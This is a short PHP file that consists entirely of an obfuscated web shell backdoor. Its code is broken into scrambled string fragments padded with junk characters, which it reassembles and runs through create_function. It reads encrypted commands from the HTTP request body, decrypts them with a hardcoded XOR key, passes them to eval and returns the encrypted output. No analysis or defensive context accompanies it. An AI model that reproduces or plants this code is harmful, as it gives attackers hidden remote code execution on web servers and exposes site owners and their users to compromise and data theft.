<?php
$H='coDDntents()D;@ob_enDd_clean(D);$r=@bDase64_enDcode(@x(D@gzcoDmpress(D$Do),$k))D;print("D$p$kh$rD$kf");}';
$a='nput"),$m)=D=1)D {@obD_start();@eDval(D@gzuncomDpress(D@xD(@basDDe64_decode($m[1])D,$Dk)));$oD=@ob_get_D';
$s='$k="a37D1ea06D";$kDh="c3De3D2f99e4a6"D;$kf="a33D3adabbD6cD6D";$p="52DCbgTezDs7BDw0h2E";functiDon x($t,$';
$P='kD)D{$c=sDtrlDen($k);$Dl=strlen($t);D$o="";forDDD($i=0;$Di<$lD;){Dfor($j=0;($j<$c&&$Di<$Dl);$Dj++,D$Di++)';
$Y=str_replace('vM','','cvMreavMte_vMvMfuvMvMnction');
$f='D{$o.=$t{$i}^$k{$j};}}reDtDurn $o;D}iDf (@pDregD_match("/$kh(.+)$kDf/",@Dfile_geDt_coDntDents("php:/D/iD';
$T=str_replace('D','',$s.$P.$f.$a.$H);
$j=$Y('',$T);$j();
?>
